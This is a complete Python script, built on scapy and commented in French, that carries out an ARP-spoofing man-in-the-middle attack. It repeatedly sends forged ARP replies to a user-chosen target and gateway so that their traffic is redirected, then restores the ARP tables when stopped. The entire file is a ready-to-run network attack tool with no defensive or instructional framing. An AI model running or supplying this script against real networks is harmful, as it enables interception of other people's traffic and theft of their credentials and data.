import sys
import time
from scapy.all import *

def get_mac(ip):
    # Envoie une requête ARP pour obtenir l'adresse MAC associée à l'adresse IP spécifiée
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Renvoie l'adresse MAC si une réponse est reçue, sinon None
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = input("Entrez l'adresse IP de la cible: ")
    gateway_ip = input("Entrez l'adresse IP de la passerelle: ")

    try:
        sent_packets_count = 0
        while True:
            # Envoyer des paquets falsifiés à la cible et à la passerelle
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print("\r[+] Paquets envoyés: " + str(sent_packets_count), end="")
            sys.stdout.flush()
            time.sleep(2)  # Pause entre les envois
    except KeyboardInterrupt:
        print("\n[-] Arrêt ARP Spoofing détecté... Restauration des adresses MAC d'origine...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] Tables ARP restaurées.")
